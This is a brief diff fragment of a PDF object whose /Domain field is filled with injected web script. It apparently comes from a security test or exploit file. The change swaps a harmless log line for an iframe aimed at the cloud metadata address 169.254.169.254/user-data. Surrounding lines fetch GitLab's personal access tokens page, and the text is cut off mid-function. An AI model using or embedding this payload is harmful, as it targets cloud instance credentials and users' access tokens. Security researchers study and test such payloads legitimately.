@@ -2,7 +2,7 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [(console.log("Starting"),
+  /Domain [(<style><iframe src=”http://169.254.169.254/user-data”>),
 fetch(
   new Request('https://gitlab.com/profile/personal_access_tokens')
 ).then(function(response) {
